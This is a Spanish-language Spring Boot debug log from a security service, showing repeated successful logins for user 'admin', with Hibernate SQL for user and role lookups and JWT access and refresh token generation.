17:10:20.321 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:20.321 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:20 MST 2025, expiration: Wed Jul 02 18:10:20 MST 2025
17:10:20.323 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:20.324 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:20.325 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:20.331 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:20.333 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:20.591 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:20.593 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:20.593 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:20 MST 2025, expiration: Wed Jul 02 18:10:20 MST 2025
17:10:20.596 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:20.597 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:20.597 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:20.605 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:20.606 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:20.869 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:20.871 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:20.872 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:20 MST 2025, expiration: Wed Jul 02 18:10:20 MST 2025
17:10:20.873 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:20.875 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:20.875 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:20.883 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:20.884 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:21.150 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:21.152 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:21.152 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:21 MST 2025, expiration: Wed Jul 02 18:10:21 MST 2025
17:10:21.154 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:21.156 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:21.156 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:21.165 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:21.167 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:21.433 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:21.435 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:21.435 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:21 MST 2025, expiration: Wed Jul 02 18:10:21 MST 2025
17:10:21.437 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:21.439 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:21.439 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:21.446 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:21.448 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:21.709 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:21.711 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:21.711 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:21 MST 2025, expiration: Wed Jul 02 18:10:21 MST 2025
17:10:21.713 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:21.714 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:21.714 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:21.722 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:21.723 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:21.982 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:21.984 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:21.984 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:21 MST 2025, expiration: Wed Jul 02 18:10:21 MST 2025
17:10:21.986 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:21.987 [http-nio-auto-4-exec-7] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:21.987 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:21.994 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:21.995 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:22.254 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:22.256 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:22.256 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:22 MST 2025, expiration: Wed Jul 02 18:10:22 MST 2025
17:10:22.258 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:22.259 [http-nio-auto-4-exec-8] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:22.259 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:22.267 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:22.268 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:22.536 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:22.539 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:22.540 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:22 MST 2025, expiration: Wed Jul 02 18:10:22 MST 2025
17:10:22.541 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:22.543 [http-nio-auto-4-exec-9] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:22.543 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:22.551 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:22.552 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:22.814 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:22.817 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:22.817 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:22 MST 2025, expiration: Wed Jul 02 18:10:22 MST 2025
17:10:22.819 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:22.821 [http-nio-auto-4-exec-10] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:22.821 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:22.828 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:22.830 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:23.089 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:23.091 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:23.091 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:23 MST 2025, expiration: Wed Jul 02 18:10:23 MST 2025
17:10:23.093 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:23.094 [http-nio-auto-4-exec-1] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:23.094 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:23.103 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:23.105 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:23.364 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:23.366 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:23.366 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:23 MST 2025, expiration: Wed Jul 02 18:10:23 MST 2025
17:10:23.368 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:23.369 [http-nio-auto-4-exec-2] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:23.369 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:23.378 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:23.379 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:23.650 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:23.652 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:23.652 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:23 MST 2025, expiration: Wed Jul 02 18:10:23 MST 2025
17:10:23.654 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:23.655 [http-nio-auto-4-exec-3] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:23.656 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:23.663 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:23.665 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:23.933 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:23.935 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:23.936 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:23 MST 2025, expiration: Wed Jul 02 18:10:23 MST 2025
17:10:23.938 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:23.940 [http-nio-auto-4-exec-4] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:23.940 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:23.947 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:23.949 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:24.208 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:24.211 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:24.211 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:24 MST 2025, expiration: Wed Jul 02 18:10:24 MST 2025
17:10:24.212 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:24.214 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:24.214 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
17:10:24.222 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:24.223 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:24.480 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:24.482 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:24.482 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:24 MST 2025, expiration: Wed Jul 02 18:10:24 MST 2025
